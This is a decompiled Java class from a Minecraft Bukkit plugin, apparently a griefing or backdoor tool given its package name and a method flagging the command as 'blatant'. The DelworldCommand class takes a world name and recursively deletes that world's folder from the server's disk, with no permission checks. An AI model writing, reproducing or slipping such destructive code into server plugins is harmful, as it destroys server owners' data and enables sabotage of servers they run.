/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.World
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.File;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;

public class DelworldCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("delWorld <world>"));
        } else {
            World w2 = Bukkit.getWorld((String)args[1]);
            if (w2 == null) {
                p2.sendMessage(Settings.PREFIX("This world doesn't exist"));
            } else if (this.PREMIUM(w2.getWorldFolder())) {
                p2.sendMessage(Settings.PREFIX("Successfully deleted world " + Settings.RED + w2.getName()));
            } else {
                p2.sendMessage(Settings.PREFIX("Failed to delete world " + Settings.RED + w2.getName()));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public boolean PREMIUM(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            for (int i2 = 0; i2 < files.length; ++i2) {
                if (files[i2].isDirectory()) {
                    this.PREMIUM(files[i2]);
                    continue;
                }
                files[i2].delete();
            }
        }
        return path.delete();
    }
}

